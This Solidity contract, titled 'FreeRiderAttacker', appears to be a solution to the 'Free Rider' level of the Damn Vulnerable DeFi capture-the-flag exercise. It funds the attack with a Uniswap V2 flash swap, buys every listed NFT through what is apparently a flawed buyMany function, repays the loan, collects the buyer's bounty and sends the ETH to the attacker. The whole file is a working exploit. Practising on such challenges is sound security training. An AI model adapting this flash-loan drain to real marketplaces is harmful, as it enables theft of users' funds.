// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";


/**
 * @title Attacker
 * @author kyrers
 * @notice This contract executes the full attack.
 */

contract FreeRiderAttacker {
    IUniswapV2Pair private pair;
    IWETH private weth;
    FreeRiderNFTMarketplace private marketplace;
    FreeRiderBuyer private buyer;
    DamnValuableNFT private nft;
    address private attacker;
    uint[] private nftIds = [0,1,2,3,4,5];

    constructor (address _pair, address _weth, address _marketplace, address _buyer, address _nft) {
        pair = IUniswapV2Pair(_pair);
        weth = IWETH(_weth);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        buyer = FreeRiderBuyer(_buyer);
        nft = DamnValuableNFT(_nft);
        attacker = msg.sender;
    }

    /**
    * @notice Initiate the attack by initiating the flashswapH 
    */
    function attack() external {
        //Encode any data to send to the swap function to indicate that it is a flashswap
        bytes memory data = abi.encode("random");

        //Get 15 WETH from Uniswap V2 pair
        pair.swap(15 ether, 0, address(this), data);
    }

    /**
    * @notice Needed to receive the flashswap. It also handles the rest of the attack
    */
    function uniswapV2Call(address, uint wethAmount, uint, bytes calldata) external {
        //Unwrap weth
        weth.withdraw(wethAmount);

        //Buy NFTs
        marketplace.buyMany{value: address(this).balance}(nftIds);

        //Calculate flashswap fee according to Uniswap documentation
        uint256 fee = ((wethAmount * 3) / 997) + 1;
        uint256 amountToRepay = wethAmount + fee;

        //Wrap ETH
        weth.deposit{value: amountToRepay}();
        
        //Payback the flashswap
        weth.transfer(address(pair), amountToRepay);

        //Transfer nfts to the buyer contract
        for(uint256 i = 0; i < 6; i++){
            nft.safeTransferFrom(address(this), address(buyer), i);
        }

        //Withdraw ETH to the attacker account
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success, "ETH transfer failed!");
    }

    /**
    * @notice Needed to receive the NFTs
    */
    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    /**
    * @notice Needed to receive the 45 + 90 ETH 
    */
    receive() external payable {}
}